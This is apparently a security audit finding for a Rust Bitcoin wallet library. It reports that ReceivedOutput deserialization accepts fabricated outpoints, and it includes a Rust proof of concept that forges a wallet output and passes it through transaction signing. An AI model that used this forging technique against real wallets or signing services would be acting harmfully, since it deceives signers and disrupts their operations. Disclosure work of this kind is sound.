### Title
Deserialization accepts fabricated Bitcoin outpoints as spendable wallet outputs - ([File: networks/bitcoin/src/wallet/mod.rs])

### Summary
`ReceivedOutput::read` accepts arbitrary untrusted bytes containing an offset, a `TxOut`, and an `OutPoint`, without establishing that the outpoint was observed on-chain or belongs to the associated transaction. [1](#0-0) 

### Finding Description
The legitimate construction path binds a `ReceivedOutput` to a transaction by scanning an actual `Transaction` and setting `outpoint` to `OutPoint::new(tx.compute_txid(), vout)`. [2](#0-1)  The deserializer bypasses that provenance check and directly trusts the serialized `TxOut` and `OutPoint`. [1](#0-0)  Later, `SignableTransaction::multisig` verifies only that the supplied offset derives the recorded output's `script_pubkey`; it does not verify that the claimed previous output exists or was produced by the scanner. [3](#0-2) 

### Impact Explanation
An attacker can provide serialized bytes representing a high-value payment to the wallet's real P2TR script while naming a nonexistent or unrelated `OutPoint`. The resulting `ReceivedOutput` reports the forged amount through `value()`, is accepted by `SignableTransaction::new`, and can reach threshold signing, but the signed transaction is invalid because its input is not spendable. [4](#0-3) [5](#0-4) [6](#0-5) 

### Likelihood Explanation
The trigger is an untrusted byte stream supplied to `ReceivedOutput::read`, an explicitly reachable input surface. The attacker needs to know or derive a wallet P2TR script, which is public address information, and can then encode any scalar offset matching that script—such as zero for the base key—along with a fabricated transaction ID and value. [7](#0-6) [1](#0-0) 

### Recommendation
Do not treat deserialized `ReceivedOutput` values as confirmed wallet inputs. Either restrict construction to `Scanner` results and authenticated local storage, or revalidate every decoded output by fetching `outpoint` from the Bitcoin node and requiring the returned `TxOut` to exactly equal the decoded `TxOut`; additionally derive the expected script from `offset` before accepting the object. [8](#0-7) [3](#0-2) 

### Proof of Concept
```rust
use bitcoin::{
  consensus::serialize,
  hashes::Hash,
  Amount, OutPoint, Transaction, TxOut, Txid,
};
use k256::Scalar;
use bitcoin_serai::wallet::{
  p2tr_script_buf, ReceivedOutput, SignableTransaction,
};

// `keys.group_key()` is the wallet's base key.
let wallet_script = p2tr_script_buf(keys.group_key()).unwrap();

// Forge a ReceivedOutput byte stream directly: offset 0, a payment to the
// wallet script, and a transaction ID/vout that was never observed.
let forged_txout = TxOut {
  value: Amount::from_sat(100_000),
  script_pubkey: wallet_script,
};
let forged_outpoint = OutPoint {
  txid: Txid::from_byte_array([0x42; 32]),
  vout: 0,
};

let mut encoded = Vec::new();
encoded.extend(Scalar::ZERO.to_bytes());
encoded.extend(serialize(&forged_txout));
encoded.extend(serialize(&forged_outpoint));

let forged = ReceivedOutput::read(&mut encoded.as_slice()).unwrap();
assert_eq!(forged.value(), 100_000);

// This succeeds because only the script/offset relationship is checked.
let signable = SignableTransaction::new(
  vec![forged],
  &[(destination_script, 1_000)],
  None,
  None,
  20,
).unwrap();
assert!(signable.multisig(&keys).is_some());

// The resulting signed transaction is unspendable because
// Txid([0x42; 32]):0 need not exist or contain the claimed output.
```

  /// Scan a transaction.
  pub fn scan_transaction(&self, tx: &Transaction) -> Vec<ReceivedOutput> {
    let mut res = Vec::new();
    for (vout, output) in tx.output.iter().enumerate() {
      // If the vout index exceeds 2**32, stop scanning outputs
      let Ok(vout) = u32::try_from(vout) else { break };

      if let Some(offset) = self.scripts.get(&output.script_pubkey) {
        res.push(ReceivedOutput {
          offset: *offset,
          output: output.clone(),
          outpoint: OutPoint::new(tx.compute_txid(), vout),
        });
      }
    }
    res
  }
